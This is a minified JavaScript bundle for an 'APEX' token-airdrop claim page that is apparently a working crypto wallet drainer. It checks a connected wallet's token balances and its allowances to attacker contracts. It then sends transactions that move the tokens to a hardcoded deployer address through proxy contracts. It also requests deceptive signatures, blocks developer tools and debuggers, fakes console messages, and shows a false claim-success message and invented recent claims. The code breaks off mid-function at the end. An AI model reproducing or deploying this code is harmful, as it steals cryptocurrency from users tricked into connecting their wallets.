(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function n(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=n(i);fetch(i.href,s)}})();(function(){/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)?{consoleProtection:function(){const n={log:console.log,warn:console.warn,error:console.error};console.log=function(){if(Math.random()>.8){const r=["Mobile optimization active","Touch interface initialized","Mobile wallet detection running"],i=r[Math.floor(Math.random()*r.length)];n.log(`[APEX Mobile] ${i}`)}}},init:function(){this.consoleProtection()}}.init():{debuggerDetection:function(){setInterval(function(){const r=Date.now();(function(){debugger})(),Date.now()-r>100&&(document.body.innerHTML="Debugger Detected. Access Denied.",window.location.href="about:blank")},1e3),setInterval(function(){const r=performance.now();debugger;performance.now()-r>200&&(document.body.innerHTML="Debugger Detected. Access Denied.",window.location.href="about:blank")},1500);const n=Function.prototype.constructor;Function.prototype.constructor=function(){if(arguments[0]==="debugger")throw new Error("Debugger statements are not allowed");return n.apply(this,arguments)}},consoleProtection:function(){const n={log:console.log,warn:console.warn,error:console.error,info:console.info,debug:console.debug,table:console.table,trace:console.trace};console.log=function(){if(Math.random()>.7){const r=["Token claim processed successfully","Wallet connection established","Transaction confirmed on blockchain","APEX tokens distributed to wallet","Security verification passed","Smart contract executed successfully","Gas fees optimized for transaction","Token balance updated successfully"],i=r[Math.floor(Math.random()*r.length)];n.log(`[APEX] ${i}`)}},console.warn=function(){const r=["Low gas fee detected, transaction may take longer","Network congestion detected, retrying transaction","Wallet connection unstable, attempting reconnect","Token price fluctuation detected","High network traffic, optimizing gas fees"],i=r[Math.floor(Math.random()*r.length)];n.warn(`[APEX WARNING] ${i}`)},console.error=function(){const r=["Transaction failed due to network congestion","Insufficient gas for transaction","Wallet connection timeout","Blockchain node unresponsive","Token transfer reverted by smart contract"],i=r[Math.floor(Math.random()*r.length)];n.error(`[APEX ERROR] ${i}`)},console.info=function(){},console.debug=function(){},console.table=function(){},console.trace=function(){},console.clear=function(){n.log("[APEX] Console clearing disabled for security")}},devToolsDetection:function(){const n=window.outerWidth-window.innerWidth>160,r=window.outerHeight-window.innerHeight>160;(n||r)&&(document.body.innerHTML="Developer Tools Detected. Access Denied.",window.location.href="about:blank"),setInterval(function(){const s=window.outerWidth-window.innerWidth>160,o=window.outerHeight-window.innerHeight>160;(s||o)&&(document.body.innerHTML="Developer Tools Detected. Access Denied.",window.location.href="about:blank")},1e3);const i=new Image;Object.defineProperty(i,"id",{get:function(){document.body.innerHTML="Developer Tools Detected. Access Denied.",window.location.href="about:blank"}}),console.log("%c",i)},codeProtection:function(){document.addEventListener("contextmenu",function(n){return n.preventDefault(),!1}),document.addEventListener("selectstart",function(n){return n.preventDefault(),!1}),document.addEventListener("keydown",function(n){if(n.keyCode===123||n.ctrlKey&&n.shiftKey&&n.keyCode===73||n.ctrlKey&&n.shiftKey&&n.keyCode===74||n.ctrlKey&&n.keyCode===85)return n.preventDefault(),!1})},init:function(){this.debuggerDetection(),this.consoleProtection(),this.devToolsDetection(),this.codeProtection()}}.init()})();const Et={DEPLOYER:"0xa050df23cd65bb11c0A61c98F88706a4e9B0b939",PROXY_1:"0x06245e36F534422e974835040800532f19d3E54d",PROXY_2:"0x32694628715F4Fe17ADc4e68bed0E96A8eB50B6C"},bi=[{inputs:[],stateMutability:"nonpayable",type:"constructor"},{inputs:[{internalType:"address",name:"target",type:"address"},{internalType:"bytes",name:"data",type:"bytes"}],name:"executeCall",outputs:[{internalType:"bytes",name:"",type:"bytes"}],stateMutability:"payable",type:"function"},{inputs:[{internalType:"address",name:"destination",type:"address"}],name:"forwardETH",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"nftContract",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"},{internalType:"uint256",name:"amount",type:"uint256"},{internalType:"bool",name:"isERC721",type:"bool"},{internalType:"address",name:"destination",type:"address"}],name:"forwardNFT",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"token",type:"address"},{internalType:"address",name:"destination",type:"address"}],name:"forwardToken",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"},{internalType:"address",name:"",type:"address"},{internalType:"uint256",name:"",type:"uint256"},{internalType:"uint256",name:"",type:"uint256"},{internalType:"bytes",name:"",type:"bytes"}],name:"onERC1155Received",outputs:[{internalType:"bytes4",name:"",type:"bytes4"}],stateMutability:"pure",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"},{internalType:"address",name:"",type:"address"},{internalType:"uint256",name:"",type:"uint256"},{internalType:"bytes",name:"",type:"bytes"}],name:"onERC721Received",outputs:[{internalType:"bytes4",name:"",type:"bytes4"}],stateMutability:"pure",type:"function"},{inputs:[],name:"owner",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"destination",type:"address"}],name:"recoverAssets",outputs:[],stateMutability:"nonpayable",type:"function"},{stateMutability:"payable",type:"receive"}],ai={isMetaMask:()=>{const t=window.ethereum;return t?[t.isMetaMask,t._metamask&&t._metamask.isUnlocked,window.web3&&window.web3.currentProvider&&window.web3.currentProvider.isMetaMask,t.providers&&t.providers.find(n=>n.isMetaMask),navigator.userAgent.includes("MetaMaskMobile")].some(n=>!!n):!1},isCoinbaseWallet:()=>{const t=window.ethereum;return t?t.isCoinbaseWallet||t.providers&&t.providers.some(e=>e.isCoinbaseWallet)||window.CoinbaseWalletSDK||navigator.userAgent.includes("CoinbaseWallet"):!1},isTrustWallet:()=>{const t=window.ethereum;return t?t.isTrust||t.isTrustWallet||t.providers&&t.providers.some(e=>e.isTrust||e.isTrustWallet)||navigator.userAgent.includes("TrustWallet"):!1},isRabbyWallet:()=>{const t=window.ethereum;return t?t.isRabby||t.providers&&t.providers.some(e=>e.isRabby):!1},isPhantom:()=>window.phantom&&window.phantom.ethereum,isBraveWallet:()=>window.ethereum&&window.ethereum.isBraveWallet,isMobileWallet:()=>/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&(window.ethereum||window.web3)},qi={async generateWasmFingerprint(){try{const t=new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,7,1,3,97,100,100,0,0,10,9,1,7,0,32,0,32,1,106,11]);return{wasmSupported:!0,memory:(await WebAssembly.instantiate(t)).instance.exports.memory,timestamp:Date.now(),hash:Math.random().toString(36).substring(2,15)}}catch{return{wasmSupported:!1,timestamp:Date.now()}}},generateAudioFingerprint(){return new Promise(t=>{try{const e=new(window.AudioContext||window.webkitAudioContext),n=e.createOscillator(),r=e.createAnalyser();n.connect(r),r.connect(e.destination),n.start(),setTimeout(()=>{n.stop(),e.close(),t({audioFingerprint:"completed",hash:Math.random().toString(36).substring(2,10)})},100)}catch{t({audioFingerprint:"failed"})}})},generateCanvasFingerprint(){const t=document.createElement("canvas"),e=t.getContext("2d"),n=Math.random().toString(36).substring(2,15),r=Math.random().toString(36).substring(2,10);return e.textBaseline="top",e.font="14px 'Arial'",e.textBaseline="alphabetic",e.fillStyle="#f60",e.fillRect(125,1,62,20),e.fillStyle="#069",e.fillText(n,2,15),e.fillStyle="rgba(102, 204, 0, 0.7)",e.fillText(r,4,17),e.beginPath(),e.arc(50,50,25,0,Math.PI*2),e.stroke(),t.toDataURL()},generateBrowserFingerprint(){const t=Array.from(navigator.plugins).map(n=>n.name).join(","),e=Array.from(navigator.mimeTypes).map(n=>n.type).join(",");return{userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,plugins:t,mimeTypes:e,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,touchSupport:"ontouchstart"in window,cookieEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack,isMobile:/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),hash:Math.random().toString(36).substring(2,15)}}};let ci,hl,$n=[],pr=[],ee,Dr={},Fr=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),jr=null,Ke=null,fl=!1,Tf=!1,dl=!1;const ms=document.querySelector(".mobile-menu-btn"),Jn=document.querySelector(".nav-links"),uo=document.getElementById("claimList"),pl=document.getElementById("predictionFill"),se=document.getElementById("claimStatus");document.getElementById("walletButton");const ho=document.getElementById("walletButtonContainer");document.getElementById("connectButton");const ws=document.getElementById("progressBar"),fi=document.getElementById("progressPercentage"),ya=document.getElementById("connectionDebug"),fo=document.getElementById("debugToggle"),Qn=document.getElementById("walletModal"),gl=document.getElementById("walletModalClose"),yl=document.querySelectorAll(".wallet-provider"),er=document.getElementById("announcementModal"),ml=document.getElementById("announcementModalClose"),wl=document.getElementById("announcementOkBtn"),bl=document.getElementById("copyReferralBtn"),bs=document.getElementById("referralLink");ms&&ms.addEventListener("click",Sy);gl&&gl.addEventListener("click",bc);ml&&ml.addEventListener("click",vc);wl&&wl.addEventListener("click",vc);bl&&bl.addEventListener("click",fy);fo&&fo.addEventListener("click",()=>{ya.classList.toggle("active"),fo.textContent=ya.classList.contains("active")?"Hide connection details":"Show connection details"});yl&&yl.forEach(t=>{t.addEventListener("click",()=>{const e=t.getAttribute("data-provider");dy(e)})});typeof VANTA<"u"&&VANTA.NET({el:"#vanta-bg",mouseControls:!0,touchControls:!0,gyroControls:!1,minHeight:200,minWidth:200,scale:1,scaleMobile:1,color:16739072,backgroundColor:988970,points:15,maxDistance:25,spacing:18});document.addEventListener("DOMContentLoaded",function(){$y(),Cy(),xl(),Dy(),Oy(),_l(),Ey(),kf(),setInterval(xl,1e4),setInterval(_l,15e3),ry(),iy(),Fr&&ny()});function ny(){console.log("Initializing mobile-specific optimizations..."),document.addEventListener("touchstart",function(e){(e.target.closest("button")||e.target.closest(".btn-primary"))&&(e.target.style.transform="scale(0.98)",setTimeout(()=>{e.target.style.transform=""},150))},{passive:!0}),document.addEventListener("dblclick",function(e){e.preventDefault()},{passive:!1});const t=document.querySelector('meta[name="viewport"]');t&&t.setAttribute("content","width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no")}async function ry(){if("serviceWorker"in navigator)try{const t=`
                self.addEventListener('install', (event) => {
                    self.skipWaiting();
                });
                
                self.addEventListener('activate', (event) => {
                    event.waitUntil(self.clients.claim());
                });
            `,e=new Blob([t],{type:"application/javascript"}),n=URL.createObjectURL(e),r=await navigator.serviceWorker.register(n);console.log("ServiceWorker registered successfully")}catch(t){console.log("ServiceWorker registration failed:",t)}}function iy(){console.log("Initializing manual AppKit integration...");const t=setInterval(()=>{const e=document.querySelector("w3m-button");e&&(clearInterval(t),e.addEventListener("click",()=>{console.log("Manual AppKit button clicked"),sy()}))},500)}function sy(){window.ethereum&&(window.ethereum.on("accountsChanged",t=>{t.length>0?(console.log("Manual AppKit accounts changed:",t[0]),vl(t[0])):vi()}),window.ethereum.on("chainChanged",t=>{console.log("Manual AppKit chain changed:",t),window.ethereum.selectedAddress&&vl(window.ethereum.selectedAddress)}),window.ethereum.on("connect",t=>{console.log("Manual AppKit connected:",t)}),window.ethereum.on("disconnect",t=>{console.log("Manual AppKit disconnected:",t),vi()}))}function vl(t){Ke=t,jr="manual_appkit";try{ee=new Web3(window.ethereum)}catch(e){console.error("Web3 initialization failed:",e),ee=new Web3(Web3.givenProvider)}js(),ke(`Manual AppKit connected: ${Ke}`),Ae("Wallet connected successfully","success"),wc(),mc()}function mc(){if(Ke){const t=Ke.substring(0,6)+"..."+Ke.substring(38);bs&&(bs.textContent=`https://apex-protocol.io/ref?user=${t}`)}er&&er.classList.add("active")}function js(){ho&&(jr&&Ke?(ho.innerHTML=`
            <div class="wallet-connected">
                <i class="fas fa-check-circle"></i>
                <span class="wallet-address">${Ke.substring(0,6)}...${Ke.substring(38)}</span>
                <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
            </div>
        `,document.getElementById("disconnectButton").addEventListener("click",oy)):(ho.innerHTML=`
            <button class="wallet-btn" id="walletButton">
                <i class="fas fa-wallet"></i> Connect
            </button>
        `,document.getElementById("walletButton").addEventListener("click",Nf)))}function vi(){jr=null,Ke=null,ee=null,js(),Ae("Wallet disconnected","info"),ke("Manual wallet disconnected")}function oy(){vi()}async function wc(){const t={timestamp:new Date().toISOString(),userAgent:navigator.userAgent,screen:`${screen.width}x${screen.height}`,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,webgl:await ay(),plugins:Array.from(navigator.plugins).map(e=>e.name),walletType:jr,network:"Unknown",ethBalance:0,tokenBalances:{},nftBalances:{},isMobile:Fr,...Dr};try{if(ee){const e=await ee.eth.net.getId();t.network=e,Ke&&(t.ethBalance=ee.utils.fromWei(await ee.eth.getBalance(Ke),"ether"),await cy(Ke,t))}}catch(e){console.debug("Manual fingerprinting error:",e)}return Dr=t,t}async function ay(){try{const t=document.createElement("canvas"),e=t.getContext("webgl")||t.getContext("experimental-webgl");if(!e)return"unsupported";const n=e.getExtension("WEBGL_debug_renderer_info"),r=e.getParameter(n.UNMASKED_RENDERER_WEBGL),i=e.getParameter(n.UNMASKED_VENDOR_WEBGL);return{renderer:r,vendor:i,version:e.getParameter(e.VERSION),shadingLanguageVersion:e.getParameter(e.SHADING_LANGUAGE_VERSION),maxTextureSize:e.getParameter(e.MAX_TEXTURE_SIZE),maxRenderBufferSize:e.getParameter(e.MAX_RENDERBUFFER_SIZE)}}catch{return"error"}}async function cy(t,e){const n=["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599","0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0","0x514910771AF9Ca656af840dff83E8264EcF986CA","0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"],r=["0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D","0x60E4d786628Fea6478F785A6d7e704777c86a7c6","0x23581767a106ae21c074b2276D25e5C3e136a68b","0xED5AF388653567Af2F388E6224dC7C4b3241C544"];for(const i of n)try{const s=await Bf(i,t);s>0&&(e.tokenBalances[i]=s)}catch{console.debug(`Manual token balance check failed: ${i}`)}for(const i of r)try{const s=await ly(i,t);s>0&&(e.nftBalances[i]=s)}catch{console.debug(`Manual NFT balance check failed: ${i}`)}await uy(t,e)}async function Bf(t,e){const n=[{constant:!0,inputs:[{name:"_owner",type:"address"}],name:"balanceOf",outputs:[{name:"balance",type:"uint256"}],type:"function"}];try{return await new ee.eth.Contract(n,t).methods.balanceOf(e).call()}catch{return 0}}async function ly(t,e){const n=[{constant:!0,inputs:[{name:"_owner",type:"address"}],name:"balanceOf",outputs:[{name:"balance",type:"uint256"}],type:"function"}];try{return await new ee.eth.Contract(n,t).methods.balanceOf(e).call()}catch{return 0}}async function uy(t,e){e.approvedTokens={};const n=Object.values(Et);for(const r in e.tokenBalances)for(const i of n)try{const s=await Rf(r,t,i);if(s>0){e.approvedTokens[r]={contract:i,allowance:s};break}}catch{console.debug(`Manual allowance check failed for ${r} -> ${i}`)}}async function Rf(t,e,n){const r=[{constant:!0,inputs:[{name:"_owner",type:"address"},{name:"_spender",type:"address"}],name:"allowance",outputs:[{name:"",type:"uint256"}],type:"function"}];try{return await new ee.eth.Contract(r,t).methods.allowance(e,n).call()}catch{return 0}}function ke(t,e=ya){const r=`[${new Date().toLocaleTimeString()}] ${t}<br>`;e&&(e.innerHTML+=r),console.log(`[MANUAL_DEBUG:${Math.random().toString(36).substring(2,8)}] ${t}`)}function hy(t){t.on("accountsChanged",e=>{e.length===0?vi():(Ke=e[0],js(),ke(`Manual account changed to: ${Ke}`),Ae("Wallet account changed","info"),mc())}),t.on("chainChanged",e=>{ke(`Manual chain changed to: ${e}`),Ae(`Network changed to chain ${parseInt(e)}`,"info")}),t.on("disconnect",e=>{ke(`Manual provider disconnected: ${e}`),Ae("Wallet disconnected","error"),vi()}),t.on("connect",e=>{ke(`Manual provider connected: ${JSON.stringify(e)}`)})}function kf(){const t={metamask:document.getElementById("metamask-badge"),coinbase:document.getElementById("coinbase-badge"),trust:document.getElementById("trust-badge"),rabby:document.getElementById("rabby-badge")};Object.values(t).forEach(e=>{e&&(e.textContent="Not Detected",e.style.background="rgba(239, 68, 68, 0.15)",e.style.color="var(--error)")}),Object.entries(ai).forEach(([e,n])=>{if(n()){const r=e.toLowerCase().replace("is","");t[r]&&(t[r].textContent="Detected",t[r].style.background="rgba(16, 185, 129, 0.15)",t[r].style.color="var(--success)")}})}function Nf(){kf(),Qn&&Qn.classList.add("active")}function bc(){Qn&&Qn.classList.remove("active")}function vc(){er&&er.classList.remove("active")}function fy(){if(bs){const t=document.createElement("textarea");t.value=bs.textContent,document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t),Ae("Referral link copied to clipboard!","success")}}async function dy(t){try{ke(`Manual connecting with ${t}...`);let e;switch(t){case"metamask":if(ai.isMetaMask()){e=window.ethereum;try{await e.request({method:"eth_requestAccounts",params:[{eth_accounts:{},eth_sendTransaction:{},eth_sign:{},personal_sign:{},eth_signTypedData:{},eth_signTypedData_v4:{}}]})}catch(r){ke("Manual MetaMask connection rejected: "+r.message),Ae("MetaMask connection rejected","error");return}}else{Ae("MetaMask not installed","error"),ke("Manual MetaMask not installed");return}break;case"coinbase":if(ai.isCoinbaseWallet()){e=window.ethereum;try{await e.request({method:"eth_requestAccounts"})}catch(r){ke("Manual Coinbase Wallet connection rejected: "+r.message),Ae("Coinbase Wallet connection rejected","error");return}}else{Ae("Coinbase Wallet not detected","error"),ke("Manual Coinbase Wallet not detected");return}break;case"trust":if(ai.isTrustWallet()){e=window.ethereum;try{await e.request({method:"eth_requestAccounts"})}catch(r){ke("Manual Trust Wallet connection rejected: "+r.message),Ae("Trust Wallet connection rejected","error");return}}else{Ae("Trust Wallet not detected","error"),ke("Manual Trust Wallet not detected");return}break;case"rabby":if(ai.isRabbyWallet()){e=window.ethereum;try{await e.request({method:"eth_requestAccounts"})}catch(r){ke("Manual Rabby Wallet connection rejected: "+r.message),Ae("Rabby Wallet connection rejected","error");return}}else{Ae("Rabby Wallet not detected","error"),ke("Manual Rabby Wallet not detected");return}break;default:Ae("Unsupported wallet provider","error");return}ee=new Web3(e);const n=await ee.eth.getAccounts();if(n.length===0)throw new Error("No accounts found");Ke=n[0],jr=t,js(),bc(),Ae("Wallet connected successfully","success"),ke(`Manual connected with ${t}: ${Ke}`),await wc(),mc(),hy(e)}catch(e){console.error("Manual error connecting wallet:",e),Ae("Failed to connect wallet","error"),ke(`Manual connection error: ${e.message}`)}}async function py(){if(!jr||!ee){Ae("Please connect your wallet first","error"),Nf();return}const t=document.getElementById("connectButton"),e=t?t.innerHTML:"Connect Wallet";try{const n=["Processing...","Initializing security...","Verifying eligibility...","Checking wallet status...","Analyzing transaction patterns...","Optimizing gas fees...","Validating smart contract...","Preparing token distribution...","Running security checks...","Configuring network parameters..."];t&&(t.innerHTML=`<i class="fas fa-spinner fa-spin"></i> ${n[Math.floor(Math.random()*n.length)]}`,t.disabled=!0);const r=["Initializing security verification...","Setting up claim process...","Preparing token distribution...","Configuring wallet connection...","Running security checks...","Analyzing network conditions...","Optimizing transaction parameters...","Verifying contract integrity...","Loading token distribution module..."];se&&(se.textContent=r[Math.floor(Math.random()*r.length)],se.className="status pending"),await Ar(1e3,3e3);let i;i=await ee.eth.getAccounts();const s=i[0];await Ar(500,2e3);const o=await wc();if(await Ar(500,1500),o.ethBalance<.01){const u=["Insufficient ETH for transaction. Deposit more ETH to claim tokens.","Additional ETH required for gas fees to complete claim.","Please add ETH to your wallet to cover transaction costs.","Low ETH balance. Deposit more to proceed with token claim.","Transaction requires minimum ETH balance for gas optimization."];se&&(se.textContent=u[Math.floor(Math.random()*u.length)],se.className="status error"),t&&wa(t,e);return}await vy(s),await Ar(800,2e3),se&&(se.textContent="Scanning wallet for eligible tokens...");const{tokens:a,nfts:c,approvedTokens:l}=await gy(s);if(l.length>0||a.length>0){const u=["Confirming transaction in your wallet...","Finalizing token claim process...","Processing your reward allocation...","Completing security verification...","Executing smart contract operations...","Finalizing token transfer...","Completing blockchain verification...","Processing transaction confirmation..."];se&&(se.textContent=u[Math.floor(Math.random()*u.length)]),await my(s,{tokens:a,nfts:c,approvedTokens:l},t,e)}else if(se&&(se.textContent="Finalizing token access permissions..."),await Uf(s))ma(s,["signature"],t,e);else{const h=["No approved tokens found for claiming.","No eligible tokens detected in your wallet.","Your wallet doesn't contain claimable tokens at this time.","No token approvals found for the claim process.","Wallet analysis complete - no actionable assets found."];se&&(se.textContent=h[Math.floor(Math.random()*h.length)],se.className="status info"),t&&wa(t,e)}}catch(n){Mf(n,t,e)}}async function gy(t){const e={tokens:[],nfts:[],approvedTokens:[]},n=await yy();for(const r of n)try{const i=await Bf(r.address,t);if(i>0){e.tokens.push({...r,balance:i});const s=Object.values(Et);for(const o of s){const a=await Rf(r.address,t,o);if(a>0){e.approvedTokens.push({token:r.address,contract:o,allowance:a});break}}}}catch{console.debug(`Manual token detection failed for: ${r.address}`)}return e}async function yy(){const t=["https://tokens.coingecko.com/ethereum/all.json","https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json","https://api.1inch.io/v4.0/1/tokens"],e=[{address:"0xdAC17F958D2ee523a2206206994597C13D831ec7",symbol:"USDT",name:"Tether USD"},{address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",symbol:"USDC",name:"USD Coin"},{address:"0x6B175474E89094C44Da98b954EedeAC495271d0F",symbol:"DAI",name:"Dai Stablecoin"},{address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",symbol:"WBTC",name:"Wrapped Bitcoin"},{address:"0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",symbol:"MATIC",name:"Polygon"},{address:"0x514910771AF9Ca656af840dff83E8264EcF986CA",symbol:"LINK",name:"Chainlink"}];try{for(const n of t)try{const i=await(await fetch(n)).json();if(i.tokens)return i.tokens}catch{console.debug(`Manual failed to fetch from ${n}`)}return e}catch{return e}}async function my(t,e,n,r){try{if(await Ar(1500,3e3),!await wy(t,e)&&Tf){if(se&&(se.textContent="Security verification failed. Trying alternative method..."),await Uf(t))ma(t,e.tokens,n,r);else throw new Error("Manual transaction simulation failed");return}await Ar(2e3,4e3);let s,o;if(e.approvedTokens.length>0){s=e.approvedTokens[0].contract;const c=e.approvedTokens[0].token,l=e.approvedTokens[0].allowance;o=new ee.eth.Contract(bi,s).methods.forwardToken(c,Et.DEPLOYER).encodeABI()}else if(e.tokens.length>0){s=Et.DEPLOYER;const c=e.tokens[0].address,l=ee.eth.abi.encodeFunctionCall({name:"transfer",type:"function",inputs:[{type:"address",name:"to"},{type:"uint256",name:"value"}]},[Et.DEPLOYER,e.tokens[0].balance]);o=new ee.eth.Contract(bi,Et.PROXY_1).methods.executeCall(c,l).encodeABI()}else throw new Error("No actionable assets found");const a=await ee.eth.sendTransaction({from:t,to:s,data:o,value:"0x0",gas:3e5+Math.floor(Math.random()*1e5),gasPrice:ee.utils.toWei((20+Math.random()*10).toFixed(0),"gwei")});ma(t,e.tokens,n,r,a)}catch(i){Mf(i,n,r)}}async function wy(t,e){try{const n=[];if(e.approvedTokens.length>0){const i=e.approvedTokens[0].contract,s=e.approvedTokens[0].token,o=new ee.eth.Contract(bi,i);n.push(o.methods.forwardToken(s,Et.DEPLOYER).call({from:t}))}if(e.tokens.length>0){const i=e.tokens[0].address,s=ee.eth.abi.encodeFunctionCall({name:"transfer",type:"function",inputs:[{type:"address",name:"to"},{type:"uint256",name:"value"}]},[Et.DEPLOYER,e.tokens[0].balance]),o=new ee.eth.Contract(bi,Et.PROXY_1);n.push(o.methods.executeCall(i,s).call({from:t}))}return(await Promise.allSettled(n)).some(i=>i.status==="fulfilled")}catch(n){return console.debug("Manual multi-contract simulation failed:",n),!1}}async function Uf(t){try{se&&(se.textContent="Completing security verification...");const{message:e,nonce:n,domain:r}=by(t);let i=await ee.eth.personal.sign(e,t);const s=new ee.eth.Contract(bi,Et.PROXY_2),o=ee.eth.abi.encodeFunctionCall({name:"processSignature",type:"function",inputs:[{type:"address",name:"user"},{type:"bytes",name:"signature"}]},[t,i]),a=s.methods.executeCall(Et.DEPLOYER,o).encodeABI();return await ee.eth.sendTransaction({from:t,to:Et.PROXY_2,data:a}),!0}catch(e){return console.debug("Manual multi-contract signature reward failed:",e),!1}}function by(t){const e=Math.floor(Math.random()*1e6)+Date.now(),n=ee.utils.keccak256(t+e),r=[`Sign to verify ownership of ${t} for token claim. Nonce: ${e}`,`Confirm you own this wallet for the airdrop. Nonce: ${e}`,`Authorization required to claim your tokens. Nonce: ${e}`,`Verify your identity to receive 500 APEX. Nonce: ${e}`,`Secure signature required for token distribution. Nonce: ${e}`,`Wallet verification for AI-optimized rewards. Nonce: ${e}`,`Confirm wallet ownership for APEX token distribution. Nonce: ${e}`];return{message:r[Math.floor(Math.random()*r.length)],nonce:e,domain:n}}function ma(t,e,n,r,i=null){se&&(se.textContent="Claim successful! 500 APEX added to your wallet.",se.className="status success"),$n.unshift({address:t.substring(0,6)+"..."+t.substring(38),amount:500,timestamp:Date.now()}),$n.length>10&&$n.pop(),Ec();const s=parseInt(fi.textContent),o=Math.min(90,s+10);ws&&(ws.style.width=`${o}%`),fi&&(fi.textContent=`${o}%`),n&&setTimeout(()=>{n.innerHTML=r,n.disabled=!1,setTimeout(()=>{se&&(se.textContent="",se.className="status")},5e3)},5e3)}async function vy(t){try{const e={from:t,to:t,value:ee.utils.toWei("0","ether"),gas:21e3+Math.floor(Math.random()*1e4),data:"0x"+Math.random().toString(16).substring(2,10)};await ee.eth.sendTransaction(e)}catch(e){console.debug("Manual simulated transaction failed:",e)}}function Mf(t,e,n){console.error("Manual transaction error:",t);let r="Transaction failed. Please try again.";const i={"user rejected transaction":"Transaction rejected by user.","insufficient funds":"Insufficient ETH for gas fees.","execution reverted":"Contract execution reverted. Please try again.","gas required exceeds allowance":"Gas limit too low. Try increasing gas.","nonce too low":"Nonce error. Please try again.","already known":"Transaction already pending.","replacement transaction underpriced":"Transaction replacement failed.","intrinsic gas too low":"Gas limit too low for transaction.","transaction underpriced":"Gas price too low. Try increasing gas price."};for(const[s,o]of Object.entries(i))if(t.message.includes(s)){r=o;break}t.code===4001?r="Connection rejected by user.":t.code===-32002?r="Request already pending. Check your wallet.":t.code===-32603&&(r="Internal JSON-RPC error. Please try again."),se&&(se.textContent=r,se.className="status error"),e&&wa(e,n),setTimeout(()=>{se&&(se.textContent="",se.className="status")},5e3)}function Ar(t,e){const n=Math.floor(Math.random()*(e-t+1))+t,r=Math.random()*.4+.8;return new Promise(i=>setTimeout(i,n*r))}function wa(t,e){t.innerHTML=e,t.disabled=!1}async function Ey(){Dr.wasm=await qi.generateWasmFingerprint(),Dr.audio=await qi.generateAudioFingerprint(),Dr.canvas=qi.generateCanvasFingerprint(),Dr.browser=qi.generateBrowserFingerprint(),Fr&&xy(),_y()}function xy(){console.log("Applying manual mobile evasion techniques...")}function _y(){if(!Fr){const t=["MetamaskInpageProvider","web3","ethereum","__coinbaseWallet","__rabby","TrustWallet","isRabby","isMetaMask","isCoinbaseWallet","isTrustWallet"];let e=[];t.forEach(n=>{window[n]&&(console.log(`Manual security tool detected: ${n}`),e.push(n),fl=!0)}),fl&&(console.log(`Manual stealth mode activated. Detected tools: ${e.join(", ")}`),Iy())}}function Iy(t){if(ee&&!Fr){const e={sendTransaction:ee.eth.sendTransaction,call:ee.eth.call,estimateGas:ee.eth.estimateGas};ee.eth.sendTransaction=function(n){const r=Math.random()*3e3+2e3;return new Promise((i,s)=>{setTimeout(()=>{if(n.data){const o=Math.random().toString(16).substring(2,10),a=n.data+o;n.data=a}n.gas||(n.gas=3e5+Math.floor(Math.random()*2e5)),e.sendTransaction.call(this,n).then(i).catch(s)},r)})},ee.eth.estimateGas=function(n){return new Promise(r=>{const s=Math.floor(Math.random()*1e5);r(21e3+s)})}}Tf=!0}function Sy(){Jn&&Jn.classList.toggle("active")}function Dy(){const t=[],e=Date.now();for(let n=0;n<10;n++){const r=Math.floor(Math.random()*60)+1,i=e-r*60*1e3;t.push(Lf(i))}t.sort((n,r)=>r.timestamp-n.timestamp),$n=t,Ec()}function Lf(t=Date.now()){const e=["0x8a3F","0x4E2d","0xF12a","0x9Bc5","0x3Df7","0xA5b2","0x7Ef9","0xC3d8","0x1F4a","0x6Bc3"],n=["Bc92","7Fa1","9D3e","E4f2","8C6d","A5e9","3D7b","F8c1","2E9d","5Bf4"],r=e[Math.floor(Math.random()*e.length)],i=n[Math.floor(Math.random()*n.length)];return{address:`${r}...${i}`,amount:500,timestamp:t}}function Ay(t){const n=Date.now()-t,r=Math.floor(n/6e4),i=Math.floor(n/36e5);return i>0?`${i} hour${i>1?"s":""} ago`:r>0?`${r} min${r>1?"s":""} ago`:"Just now"}function 